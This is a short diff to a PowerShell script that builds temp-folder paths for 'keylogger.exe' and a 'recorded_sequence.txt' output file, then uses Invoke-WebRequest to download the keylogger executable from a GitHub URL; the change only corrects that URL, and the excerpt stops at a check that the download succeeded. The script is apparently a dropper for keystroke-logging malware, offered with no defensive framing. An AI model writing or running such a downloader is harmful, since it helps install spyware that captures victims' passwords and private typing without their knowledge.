@@ -11,7 +11,7 @@ $exeFilePath = [System.IO.Path]::Combine($tempFolderPath, 'keylogger.exe')
 $textFilePath = [System.IO.Path]::Combine($tempFolderPath, 'recorded_sequence.txt')
 
 # Download the executable from the GitHub URL to the temporary folder
-Invoke-WebRequest -Uri 'https://github.com/muratcx/PythonProjects/raw/main/keylogger/dist/keylogger/keylogger.exe' -OutFile $exeFilePath
+Invoke-WebRequest -Uri 'https://github.com/muratcx/PythonProjects/raw/main/keylogger/dist/keylogger.exe' -OutFile $exeFilePath
 
 # Check if the download was successful
 if (Test-Path -Path $exeFilePath) {
